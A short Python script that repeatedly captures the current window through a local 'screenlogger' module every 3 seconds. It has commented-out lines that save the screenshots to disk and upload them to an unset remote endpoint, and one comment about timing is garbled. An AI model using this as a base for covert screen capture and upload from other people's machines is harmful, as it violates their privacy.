import screenlogger
import sendinginfo
import time
from io import BytesIO
from PIL import Image
import os

BASE_PATH = ""
SEND_FILE_ENDPOINT = ""

# Ensure the photos folder exists
os.makedirs("photos", exist_ok=True)

counter = 0  # To generate unique filenames

def save_image(payload):
    # Rebuild image from payload
    img_bytes = payload["file"][1]  # raw JPEG bytes
    img = Image.open(BytesIO(img_bytes))
    
    # Save to disk in photos folder
    filename = f"photos/screenshot_{counter}.jpg"
    img.save(filename, format="JPEG")
    print(f"Saved screenshot to {filename}")

while True:
    print(counter)
    payload = screenlogger.log_current_window()
    print(payload)
    #save_image(payload)
    #sendinginfo.send_screenshot_jpeg(url=SEND_FILE_ENDPOINT, files=payload)

    counter += 1
    time.sleep(3)  # 30,000 secondsprint(counter); adjust as needed
